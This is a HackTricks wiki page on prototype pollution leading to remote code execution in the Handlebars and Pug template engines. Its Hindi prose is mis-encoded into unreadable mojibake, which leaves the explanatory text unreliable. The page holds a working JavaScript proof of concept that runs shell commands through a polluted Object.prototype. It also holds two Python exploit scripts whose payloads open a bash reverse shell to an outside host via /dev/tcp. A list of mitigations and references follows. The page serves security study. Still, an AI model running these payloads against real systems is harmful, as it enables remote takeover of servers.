рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рдПрдХ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реБрд╢рди рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИред рдпрд╣ рд╡рдВрд░реБрд▓реНрдирд░рдмрд┐рд▓рд┐рдЯреА `javascript-compiler.js` рдлрд╝рд╛рдЗрд▓ рдХреЗ рднреАрддрд░ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рд╕реЗ рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `appendContent` рдлрд╝рдВрдХреНрд╢рди, рдпрджрд┐ рдпрд╣ рдореМрдЬреВрдж рд╣реИ, рддреЛ `pendingContent` рдХреЛ рдЬреЛрдбрд╝рддрд╛ рд╣реИ, рдЬрдмрдХрд┐ `pushSource` рдлрд╝рдВрдХреНрд╢рди рд╕реНрд░реЛрдд рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рдмрд╛рдж `pendingContent` рдХреЛ `undefined` рдкрд░ рд░реАрд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИред

**рд╢реЛрд╖рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛**

рд╢реЛрд╖рдг AST (рдПрдмреНрд╕реНрдЯреНрд░реИрдХреНрдЯ рд╕рд┐рдВрдЯреИрдХреНрд╕ рдЯреНрд░реА) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реИ: 

1. **рдкрд╛рд░реНрд╕рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ**: рдкрд╣рд▓реЗ, рдкрд╛рд░реНрд╕рд░, `NumberLiteral` рдиреЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдорд╛рдиреЛрдВ рдХреЛ рд╕рдВрдЦреНрдпрд╛рддреНрдордХ рдмрдирд╛рддрд╛ рд╣реИред рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реБрд╢рди рдЗрд╕реЗ рдЪрдХреНрдХрд░ рдореЗрдВ рдбрд╛рд▓ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЧреИрд░-рд╕рдВрдЦреНрдпрд╛рддреНрдордХ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХреЛ рдбрд╛рд▓рд╛ рдЬрд╛ рд╕рдХреЗред
2. **рдХрдВрдкрд╛рдЗрд▓рд░ рджреНрд╡рд╛рд░рд╛ рд╣реИрдВрдбрд▓рд┐рдВрдЧ**: рдХрдВрдкрд╛рдЗрд▓рд░ рдПрдХ AST рдСрдмреНрдЬреЗрдХреНрдЯ рдпрд╛ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ `input.type` `Program` рдХреЗ рдмрд░рд╛рдмрд░ рд╣реИ, рддреЛ рдЗрдирдкреБрдЯ рдХреЛ рдкреВрд░реНрд╡-рдкрд╛рд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рд╢реЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
3. **рдХреЛрдб рдХрд╛ рдбрд╛рд▓рдирд╛**: `Object.prototype` рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╢реЛрд╖рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЛрдб рдбрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЯреЗрдореНрдкрд▓реЗрдЯ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рджреВрд░рд╕реНрде рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рд╡рдВрд░реБрд▓реНрдирд░рдмрд┐рд▓рд┐рдЯреА рдХреЗ рд╢реЛрд╖рдг рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
рдпрд╣ рдХреЛрдб рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреИрд╕реЗ Handlebars рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рд╡рд┐рдЪрд┐рддреНрд░ рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

**рдмрд╛рд╣рд░реА рд╕рдВрджрд░реНрдн**: 'flat' рдкреБрд╕реНрддрдХрд╛рд▓рдп рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдПрдХ рдореБрджреНрджрд╛ рдорд┐рд▓рд╛ рдерд╛, рдЬрд┐рд╕рдХрд╛ рд╡рд┐рд╡рд░рдг рдпрд╣рд╛рдБ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ: [рдЧрд┐рдЯрд╣рдм рдкрд░ рдореБрджреНрджрд╛](https://github.com/hughsk/flat/issues/105)ред

**рдмрд╛рд╣рд░реА рд╕рдВрджрд░реНрдн**: [рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдореБрджреНрджрд╛ 'flat' рдкреБрд╕реНрддрдХрд╛рд▓рдп рдореЗрдВ](https://github.com/hughsk/flat/issues/105)

рдкрд╛рдпрдерди рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдЙрддреНрдкреАрдбрд╝рди рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pug рд╕реБрд░рдХреНрд╖рд┐рддрддрд╛ рджреЛрд╖

Pug, рдПрдХ рдФрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди, рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди рдХрд╛ рдПрдХ рд╕рдорд╛рди рдЬреЛрдЦрд┐рдо рдЙрдард╛рддрд╛ рд╣реИред рд╡рд┐рд╕реНрддреГрдд рдЬрд╛рдирдХрд╛рд░реА [AST Injection in Pug](https://blog.p6.is/AST-Injection/#Pug) рдкрд░ рдЪрд░реНрдЪрд╛ рдореЗрдВ рдЙрдкрд▓рдмреНрдз рд╣реИред

Pug рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### рдкреНрд░рддрд┐рдмрдВрдзрд╛рддреНрдордХ рдЙрдкрд╛рдп

рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдХреЗ рдЬреЛрдЦрд┐рдо рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдиреАрдЪреЗ рджреА рдЧрдИ рд░рдгрдиреАрддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

1. **рдСрдмреНрдЬреЗрдХреНрдЯ рдЕрдкрд░рд┐рд╡рд░реНрддрдиреАрдпрддрд╛**: `Object.freeze` рд▓рд╛рдЧреВ рдХрд░рдХреЗ `Object.prototype` рдХреЛ рдЕрдкрд░рд┐рд╡рд░реНрддрдиреАрдп рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
2. **рдЗрдирдкреБрдЯ рдорд╛рдиреНрдпрддрд╛**: JSON рдЗрдирдкреБрдЯ рдХреЛ рдЕрдиреБрдкрд╛рд▓рди рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕реНрдХреАрдорд╛ рдХреЗ рд╕рд╛рдеред
3. **рд╕реБрд░рдХреНрд╖рд┐рдд рдорд░реНрдЬ рдлрд╝рдВрдХреНрд╢рди**: рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рд░рд┐рдХрд░реНрд╕рд┐рд╡ рдорд░реНрдЬ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
4. **рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк-рд░рд╣рд┐рдд рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕**: `Object.create(null)` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдЧреБрдгреЛрдВ рдХреЗ рдмрд┐рдирд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдмрдирд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред
5. **рдореИрдк рдХрд╛ рдЙрдкрдпреЛрдЧ**: `Object` рдХреА рдмрдЬрд╛рдп, рдХреБрдВрдЬреА-рдорд╛рди-рдЬреЛрдбрд╝реЗ рд╕рдВрдЧреНрд░рд╣рдг рдХреЗ рд▓рд┐рдП `Map` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
6. **рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдЕрдкрдбреЗрдЯреНрд╕**: рд╕реБрд░рдХреНрд╖рд╛ рдкреИрдЪ рдХреЛ рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдЕрдкрдбреЗрдЯ рдХрд░рдХреЗ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
7. **рд▓рд┐рдВрдЯрд░ рдФрд░ рд╕реНрдерд┐рд░ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдЙрдкрдХрд░рдг**: рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдХреА рдЬреЛрдЦрд┐рдореЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдФрд░ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП ESLint рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
8. **рдХреЛрдб рд╕рдореАрдХреНрд╖рд╛**: рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╕рдВрднрд╛рд╡рд┐рдд рдЬреЛрдЦрд┐рдореЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдФрд░ рд╕реБрдзрд╛рд░ рдХреЗ рд▓рд┐рдП рд╡реНрдпрд╛рдкрдХ рдХреЛрдб рд╕рдореАрдХреНрд╖рд╛ рдХреЛ рд▓рд╛рдЧреВ рдХрд░реЗрдВред
9. **рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рд╢рд┐рдХреНрд╖рдг**: рдбреЗрд╡рд▓рдкрд░реНрд╕ рдХреЛ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдХреЗ рдЬреЛрдЦрд┐рдореЛрдВ рдФрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рдХреЛрдб рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрддреНрддрдо рдкреНрд░рдерд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╢рд┐рдХреНрд╖рд┐рдд рдХрд░реЗрдВред
10. **рд╕рддрд░реНрдХрддрд╛ рдХреЗ рд╕рд╛рде рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ**: рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреА рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп рд╕рддрд░реНрдХ рд░рд╣реЗрдВред рдЙрдирдХреА рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрдерд┐рддрд┐ рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░реЗрдВ рдФрд░ рдЙрдирдХреЗ рдХреЛрдб рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░реЗрдВ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╡реЗ рдЬреЛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд░рд╣реЗ рд╣реЛрдВред
11. **рд░рдирдЯрд╛рдЗрдо рд╕реБрд░рдХреНрд╖рд╛**: рд╕реБрд░рдХреНрд╖рд╛-рдХреЗрдВрджреНрд░рд┐рдд npm рдкреИрдХреЗрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рд╣рдорд▓реЛрдВ рдХреЛ рдкрд╣рдЪрд╛рдирдиреЗ рдФрд░ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рд░рдирдЯрд╛рдЗрдо рд╕реБрд░рдХреНрд╖рд╛ рддрдВрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

## рд╕рдВрджрд░реНрдн

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
